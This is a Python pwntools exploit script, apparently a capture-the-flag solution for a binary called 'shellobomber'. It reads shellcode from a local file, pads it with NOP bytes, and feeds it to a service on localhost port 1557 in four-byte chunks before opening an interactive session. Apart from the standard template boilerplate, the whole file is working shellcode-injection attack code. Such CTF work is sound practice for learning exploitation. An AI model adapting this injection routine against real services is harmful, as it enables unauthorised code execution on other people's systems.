#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./shellobomber
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./shellobomber')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

shell = open('./as','rb')

shellcode = shell.read()

shellcode+=b'\x90'*(4-len(shellcode)%4)

print(shellcode)

#io = start()
io = remote('localhost',1557)

for i in range(len(shellcode)//4):
    io.sendlineafter(b'>>',shellcode[i*4:i*4+4])
io.sendlineafter(b'>>',b'stop')

io.interactive()

